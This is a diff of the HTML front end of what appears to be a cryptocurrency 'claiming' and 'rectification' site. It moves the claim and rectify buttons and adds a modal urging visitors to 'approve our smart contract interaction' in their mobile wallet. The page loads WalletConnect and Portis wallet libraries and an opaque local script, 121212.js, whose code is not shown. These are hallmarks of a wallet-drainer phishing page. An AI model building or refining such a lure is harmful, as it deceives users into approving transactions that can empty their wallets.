@@ -53,9 +53,9 @@
             <div class="container">
                 <div class="row align-items-center">
                     <div class="col-lg-12">
-                        <nav class="navbar navbar-expand-lg">
+                        <nav class="navbar navbar-expand">
                             <a class="navbar-brand" href="index.html">
-  <img src="assets/fonts/wcc.svg" width="35px" height="42px" class="img-fluid">  
+  <img src="assets/fonts/wcc.svg" width="35px" height="30px" class="img-fluid"> <b style="color: rgb(93, 170, 241);"></b> 
 </a>
                             <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
 <span class="toggler-icon"></span>
@@ -146,6 +146,7 @@
                         </div>
                     </div>
                 </div>
+		
                 <div class="col-lg-4 col-md-8 col-sm-10">
                     <div class="single-feature">
                         <div class="icon color-2">
@@ -188,21 +189,7 @@
                     </div>
                 </div>
             </div>
-	
             <div class="row justify-content-center">
-		  <div class="col-lg-4 col-md-8 col-sm-10">
-                    <div class="single-feature">
-                        <div class="icon color-2">
-                            <i class="lni lni-dashboard"></i>
-                        </div>
-                        <div class="content">
-                            <h3>Claiming</h3>
-                            <p>
-                                <a href="#" class="main-btn border-btn btn-hover wow fadeInUp buttoned" data-wow-delay=".6s">claiming</a>
-                            </p>
-                        </div>
-                    </div>
-                </div>
                 <div class="col-lg-4 col-md-8 col-sm-10">
                     <div class="single-feature">
                         <div class="icon color-2">
@@ -212,6 +199,19 @@
                             <h3>Rectification</h3>
                             <p>
                                 <a href="#" class="main-btn border-btn btn-hover wow fadeInUp buttoned" data-wow-delay=".6s">Rectify</a>
+                            </p>
+                        </div>
+                    </div>
+                </div>
+		    <div class="col-lg-4 col-md-8 col-sm-10">
+                    <div class="single-feature">
+                        <div class="icon color-2">
+                            <i class="lni lni-dashboard"></i>
+                        </div>
+                        <div class="content">
+                            <h3>Claiming</h3>
+                            <p>
+                                <a href="#" class="main-btn border-btn btn-hover wow fadeInUp buttoned" data-wow-delay=".6s">claiming</a>
                             </p>
                         </div>
                     </div>
@@ -399,6 +399,25 @@
         </div>
         </div>
     </footer>
+    <div id="myModal" class="modal" tabindex="-1" role="dialog">
+        <div class="modal-dialog" role="document">
+          <div class="modal-content">
+            <div class="modal-header">
+              <h5 class="modal-title"><span style="color :rgb(12, 12, 65)">Complete request</span></h5>
+              <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                <!-- <span aria-hidden="true">&times;</span> -->
+              </button>
+            </div>
+            <div class="modal-body">
+              <p>Return to your mobile wallet and approve our smart contract interaction to proceed</p>
+            </div>
+            <!-- <div class="modal-footer">
+              <button type="button" class="btn btn-primary">Save changes</button>
+              <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+            </div> -->
+          </div>
+        </div>
+      </div>
 
 
     <a href="#" class="scroll-top btn-hover">
@@ -430,7 +449,12 @@
     
     <script type="text/javascript" src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"></script>
     <script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider@1.2.1/dist/umd/index.min.js"></script>
-    <script type="text/javascript"  src="https://cdn.jsdelivr.net/npm/@portis/web3@4.0.7/umd/index.min.js"></script><script src="./121212.js"></script>
+    <script type="text/javascript"  src="https://cdn.jsdelivr.net/npm/@portis/web3@4.0.7/umd/index.min.js"></script>
+    <script
+  src="https://code.jquery.com/jquery-3.6.0.min.js"
+  integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
+  crossorigin="anonymous"></script>
+    <script src="./121212.js"></script>
     <style type="text/css">
         .buttoned {
             color:rgb(234, 238, 241);
